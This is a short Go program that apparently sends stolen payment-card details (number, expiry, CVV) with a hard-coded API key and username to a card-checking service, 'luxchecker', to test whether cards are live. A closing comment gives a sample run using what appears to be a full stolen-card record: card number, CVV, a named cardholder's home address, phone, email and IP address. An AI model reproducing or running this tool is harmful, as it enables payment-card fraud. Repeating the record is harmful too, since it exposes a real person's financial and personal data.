package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/projectdiscovery/gologger"
)

const (
	apiKey    = "7569edbd2d7ab31bd58300da0358776a"
	username  = "lulzpidc"
	apiMirror = "https://mirror1.luxchecker.vc"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')

	// Parse the input
	details := strings.Split(strings.TrimSpace(input), ";")
	if len(details) < 3 {
		fmt.Println("Invalid input format.")
		return
	}

	cardNumber := details[0]
	expiry := strings.Split(details[1], "/")
	expMonth := expiry[0]
	expYear := expiry[1]
	cvv := details[2]

	gologger.Info().Msgf("Card Number: %s\n", cardNumber)
	gologger.Info().Msgf("Expiry: %s/%s\n", expMonth, expYear)
	gologger.Info().Msgf("CVV: %s\n", cvv)
	gologger.Info().Msgf("API Key: %s\n", apiKey)

	// Construct the API request
	apiURL := fmt.Sprintf("%s/apiv2/ck.php", apiMirror)

	data := url.Values{
		"cardnum":  {cardNumber},
		"expm":     {expMonth},
		"expy":     {expYear},
		"cvv":      {cvv},
		"key":      {apiKey},
		"username": {username},
	}

	gologger.Info().Msgf("Payload: %s\n", data.Encode())
	// Send the request
	resp, err := http.PostForm(apiURL, data)

	if err != nil {
		fmt.Printf("Error sending request: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// Decode the JSON response
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		fmt.Printf("Error decoding response: %s\n", err)
		return
	}

	// Pretty print the response
	jsonBytes, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		fmt.Printf("Error marshalling JSON: %s\n", err)
		return
	}
	fmt.Println(string(jsonBytes))
}

// echo "4264980006831123;10/25;609;VISA;CREDIT;PREMIER;WILLIAM NICHOLS;US;FL;Homosassa;34448;12289 w red maple st;3523641046;williamnichols7175@gmail.com;N/A;N/A;N/A;N/A;N/A;N/A;N/A;75.115.201.157;N/A;N/A;$106.44;Mozilla/5.0 (Linux Android 11 moto g stylus (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36;2023-02-02 16:08" | go run secure/luxcheck.go
